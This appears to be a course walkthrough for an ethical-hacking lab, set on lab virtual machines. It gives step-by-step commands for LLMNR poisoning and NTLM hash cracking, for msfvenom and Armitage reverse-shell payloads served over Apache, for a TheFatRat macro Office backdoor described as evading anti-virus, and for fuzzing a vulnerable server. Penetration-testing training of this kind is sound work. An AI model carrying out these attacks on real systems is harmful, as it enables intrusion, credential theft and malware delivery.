# Lab 1: Gain Access to the System

## Task 1: Perform Active Online Attack to Crack the System’s Password using Responder
LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OSes that are used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OSes and can be used to extract the password hashes from a user.

Since the awareness of this attack is low, there is a good chance of acquiring user credentials in an internal network penetration test. By listening for LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim’s user-credentials by using a tool such as Responder.py.

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.

Here, we will use the Responder tool to extract information such as the target system’s OS version, client version, NTLM client IP address, and NTLM username and password hash.

1. Open the Ubuntu machine and the Windows machine
2. In the Ubuntu machine, open the terminal and cd into the Responder directory
3. Type `chmod +x ./Responder.py` to grant permissions to run the script
4. Type `sudo ./Responder.py -I eth0 to run responder
5. Responder is now listening for events on that network interface
6. Switch back to the Windows 10 machine
7. Right click the Windows icon and open the file explorer
8. Navigate to the network share folder `\\CEH-Tools`
9. Reopen the Ubuntu machine
10. The responder program will have started capturing the access logs of the Windows 10 machine; it collects the hashes of the logged-in user of the target machine
11. Navigate to the log location (by default `/Home/Responder/logs`) and double click the `SMB-NTLMv2-SSP-10.10.10.10.txt` file
12. The log file will open and display the hashes recorded from the target system user
13. Close all those windows and open a terminal window
14. Install John the Ripper with `sudo snap install john-the-ripper`
15. When it installs, type `sudo john /home/ubuntu/Responder/logs/<log name>`
16. The program will begin cracking the password


## Task 2: Audit System Passwords using L0phtCrack
L0phtCrack is a tool designed to audit passwords and recover applications. It recovers lost Microsoft Windows passwords with the help of a dictionary, hybrid, rainbow table, and brute-force attacks. It can also be used to check the strength of a password.

In this lab, as an ethical hacker or penetration tester, you will be running the L0phtCrack tool by providing the remote machine’s administrator with user credentials. User account passwords that are cracked in a short amount of time are weak, meaning that you need to take certain measures to strengthen them.

1. Install and run L0phtCrack
2. When it opens, select the Password Auditing Wizard
3. Select the Windows button
4. Select the remote machine button
5. Enter the IP address of the target machine, the username, and the password
6. Choose the thorough password audit
7. Select the generate report at end of auditing button and store the file in a good location
8. Run the job immediately and view the results


## Task 3: Exploit Client-Side Vulnerabilities and Establish a VNC Session
Attackers use client-side vulnerabilities to gain access to the target machine. VNC (Virtual Network Computing) enables an attacker to remotely access and control the targeted computers using another computer or mobile device from anywhere in the world. At the same time, VNC is also used by network administrators and organizations throughout every industry sector for a range of different scenarios and uses, including providing IT desktop support to colleagues and friends and accessing systems and services on the move.

This lab demonstrates the exploitation procedure enforced on a weakly patched Windows 10 machine that allows you to gain remote access to it through a remote desktop connection.

Here, we will see how attackers can exploit vulnerabilities in target systems to establish unauthorized VNC sessions using Metasploit and remotely control these targets.

1. Open the Parrot Security machine
2. Open MATE terminal
3. Type `sudo su` to switch to a root user and enter the password to log in
4. `cd` into the root directory
5. Type `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<host IP> LPORT=444 -o /root/Desktop/Test.exe`
6. This will generate Test.exe, a malicious file, in the root desktop folder
7. Type `mkdir /var/www/html/share` to create a shared folder
8. Type `chmod -R 755 /var/www/html/share` to change the permissions of that folder
9. `chown -R www-data:www-data /var/www/html/share
10. Copy the malicious file to the shared folder with `cp /root/Desktop/Test.exe /var/www/html/share`
11. Start Apache with `service apache2 start`
12. Type `msfconsole` to launch the metasploit framework
13. Type `use exploit/multi/handler`
14. Type `set payload windows/meterpreter/reverse_tcp` to select the payload
15. Type `set LHOST 10.10.10.13`
16. Type `set LPORT 444`
17. Type `exploit` to start the exploit
18. Switch back to the Windows machine
19. Open a web browser and go to `https://10.10.10.13/share`
20. Click on the `test.exe` file to download it
21. Save the file, run it, and ignore the warnings
22. Return to the Parrot Security machine
23. Observe that a meterpreter shell has been opened
24. If the shell hasn't been opened, type `sessions -i 1`
25. Type `sysinfo` to verify that you are in the target
26. Type `upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1` to upload the powersploit file to the target system's present directory
27. Type `shell` to open a shell session
28. Type `powershell -ExecutionPolicy Bypass - Command "..\PowerUp.ps1;Invoke-AllChecks` to run PowerUp.ps1
29. View the results, then type `exit` to return
30. Type `run vnc` to exploit VNC vulnerability to gain remote access
31. This will open a VNC session for the target machine, which can be used to see the victim's activities on the system


## Task 4: Gain Access to a Remote System using Armitage
Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework. Using this tool, you can create sessions, share hosts, capture data, downloaded files, communicate through a shared event log, and run bots to automate pen testing tasks.

1. Open the Windows machine and the Parrot Security machine
2. On the Parrot Security machine, open MATE terminal
3. Type `sudo su` to switch to root
4. `cd` to the root directory
5. Type `service postgresql start` to start the database service
6. In the top bar, open Applications -> Pentesting -> Exploitation Tools -> Metasploit Framework -> armitage to open the armitage tool
7. When the connect pop-up appears, leave the settings to default and click connect
8. Click yes when asked to open metasploit
9. After loading, the armitage window will appear
10. Click on hosts from the menu bar and navigate to Nmap scan -> Intense scan to scan for live hosts on the network
11. When the input pop-up appears, type the target IP address of the Windows machine and press OK
12. Click OK on the message pop-up
13. In the left pane, open the payload noed and navigate to Windows -> meterpreter and double click meterpreter_reverse_tcp
14. In the new window, enter the LPORT as 444 and select exe in the output field, then click launch
15. Set the file name as `malicious_payload.exe` and save it to the desktop
16. Click OK in the message pop-up
17. Switch to the terminal and type `cp /root/Desktop/malicious_payload.exe /var/www/html/share/`
18. Type `service apache2 start`
19. Reopen armitage and double click `meterpreter_reverse_tcp`
20. In the new window, set the LPORT option to 444 and ensure that the `multi/handler` option is selected in output, then press launch
21. Switch to the Windows machine and launch a web browser
22. Navigate to `http://10.10.10.13/share`
23. Download `malicious_payload.exe` to download the file
24. Run the file and ignore the security warning
25. Reopen the Parrot Security machine
26. Observe that a meterpreter shell has been opened within armitage
27. Right-click on the target host and select Meterpreter 1 -> interact -> Meterpreter shell
28. In the new Meterpreter 1 tab, type `sysinfo` to view the system details of the exploited system
29. Right-click the target host and navigate to `meterpreter 1 -> explore -> browse files`
30. In the new files 1 tab, observe the file present in the download folder
31. Using this option, you could perform various functions such as uploading a file, making a directory, and listing all drive present in the target system
32. Right-click on the target host and navigate to `meterpreter 1 -> explore -> screenshot`
33. In the new screenshot 1 tab, view the open windows in the target system


## Task 5: Hack a Windows Machine with a Malicious Office Document using TheFatRat
Social engineering is one of hackers’ most typically used attacks. As recent trends suggest, many big organizations fall victim to this attack vector. The attackers trick an employee of a workplace into clicking links in a legitimate-looking document, which turns out to be malicious and can even evade anti-virus programs.

TheFatRat is an exploitation tool that compiles malware with a popular payload that can then be executed on Windows, Android, and Mac OSes. The software offers an easy way to create backdoors and payloads that can bypass most anti-viruses.

Here, we will use TheFatRat to hack the Windows machine with a malicious office document.

1. Open the Parrot Security machine and open MATE terminal
2. Switch to root and navigate the the root folder
3. Type `fatrat` to launch fatrat
4. After fatrat verifies dependencies, press enter twice
5. In the fatrat menu, type `6` to choose `[06] Create Fud Backdoor 1000% with PwnWinds [Excelent]`
6. Type `3` in the new menu to choose `[3] Create exe file with apache + Powershell (FUD 100%)`
7. When asked, enter `10.10.10.13` as the LHOST IP
8. Next, enter `4444` as the LPORT
9. Type `payload` as the base name for output files
10. When asked to choose a payload, enter `3` to choose `[3] windows/meterpreter/reverse_tcp`
11. When it finishes, press enter to continue
12. This has generated a `payload.exe` file at `root/Fatrat_generated`
13. In the menu, press `9` to return to the menu
14. Type `7` to choose `[07] Create Backdoor For Office with Microsploit`
15. In the microsploit menu, enter `2` to choose `|2| The Microsoft Office Macro on Windows`
16. Set the LHOST IP as `10.10.10.13` and the LPORT as `4444`
17. When asked to choose a name, enter `BadDoc`
18. Type whatever you want for the message body
19. When asked to use a custom exe file backdoor, type `y` and set the path as `/root/FatRat_Generated/payload.exe`
20. Type `3` to choose `[3] windows/meterpreter/reverse_tcp` as the payload
21. When the results appear, press enter to continue
22. Open `/root/FatRat_Generated` to view the files
23. In a new terminal, switch to root and navigate to the root directory
24. Type `cp /root/Fatrat_Generated/BadDoc.docm /var/www/html/share` to copy the generated malicious document to the shared folder
25. Type `service apache2 start` to start the apache service
26. Type `msfconsole` to start metasploit
27. In metasploit, type `use exploit/multi/handler`
28. Type `set payload windows/meterpreter/reverse_tcp`
29. Type `set LHOST 10.10.10.13`
30. Type `set LPORT 4444`
31. Type `exploit` to begin
32. Switch to Windows and open a web browser, then navigate to `https://10.10.10.13/share`
33. Download BadDoc.docm and open it
34. Click `enable editing` in the word document
35. Click `enable content`
36. Switch back to the Parrot Security machine and observe the meterpreter shell session
36. Type `sysinfo` to view the details of the exploited system

## Task 6: Perform Buffer Overflow Attack to Gain Access to a Remote System
A buffer is an area of adjacent memory locations allocated to a program or application to handle its runtime data. Buffer overflow or overrun is a common vulnerability in applications or programs that accept more data than the allocated buffer. This vulnerability allows the application to exceed the buffer while writing data to the buffer and overwrite neighboring memory locations. Further, this vulnerability leads to erratic system behavior, system crash, memory access errors, etc. Attackers exploit a buffer overflow vulnerability to inject malicious code into the buffer to damage files, modify program data, access critical information, escalate privileges, gain shell access, etc.

This task demonstrates the exploitation procedure applied to a vulnerable server running on the victim’s system. This vulnerable server is attached to Immunity Debugger. As an attacker, we will exploit this server using malicious script to gain remote access to the victim’s system.

1. Open the Windows machine and open vulnserver.exe as administrator
2. Minimize the vulnserver command prompt and open ImmunityDebugger as administrator
3. Press file -> attach, and open the vulnserver process
4. In the top bar, select the play button to unpause the program
5. Switch to Parrot Security
6. Open MATE terminal
7. Switch to root and navigate to the root directory
8. Type `nc -nv 10.10.10.10 9999` to establish a connection with the vulnerable server
9. Explore the commands with `HELP`
10. When familiar, return to the terminal with `EXIT`
11. To create a spike template, type `pluma stats.spk`
12. A spike template defines the package formats used for communicating over netcat; they are useful for testing and identifying functions
13. In the newly opened text editor, type `s_readline();` on the first line, `s_string("STATS ");` on the second line, and `s_string_variable("0");` on the third line
14. Save and close the file
15. In the terminal window, type `generic send_tcp 10.10.10.10 9999 stats.spk 0 0`
16. While the script runs, return to the Windows 10 machine
17. The fact that the program is still in the `running` state indicates that the STATS function isn't vulnerable to buffer overflow
18. Return to the Parrot Security machine
19. In the terminal, press `Ctrl+C` to terminate the script
20. Type `pluma trun.spk` to open another text file
21. In the first line, type `s_readline();`, `s_string("TRUN ");` in the second line, and `s_string_variable("0");` in the third line.
22. Save and close the file, and type `generic_send_tcp 10.10.10.10 9999 trun.spk 0 0`
23. Leave the script running and reopen the Windows machine
24. Observe that the program is now in the `paused` state, indicating that the TRUN function is vulnerable to buffer overflow
25. Return to the Parrot Security machine and terminate the script
26. Return to the Windows machine and close and reopen both Immunity Debugger and the vulnerable server as administrator
27. Return to the Parrot Security machine
28. In the top bar, open places -> network
29. Press `Ctrl+L` to open the location field
30. In it, type `smb://10.10.10.10` to access the Windows 10 shared folder
31. In the security pop-up, enter the credentials for the Windows machine
32. Navigate through the folders and copy the Scripts folder, then paste it on the desktop
33. Close the folder window
34. Open the terminal window and type `cd /home/attacker/Desktop/Scripts/`
35. Type `chmod +x fuzz.py` to change the script permissions
36. Type `./fuzz.py` to run the fuzzing script
37. Return to the Windows machine and open the command prompt with the vulnerable server running
38. Switch to the Immunity Debugger window and observe the status change from Running to Paused
39. Return to the Parrot Security machine and stop the script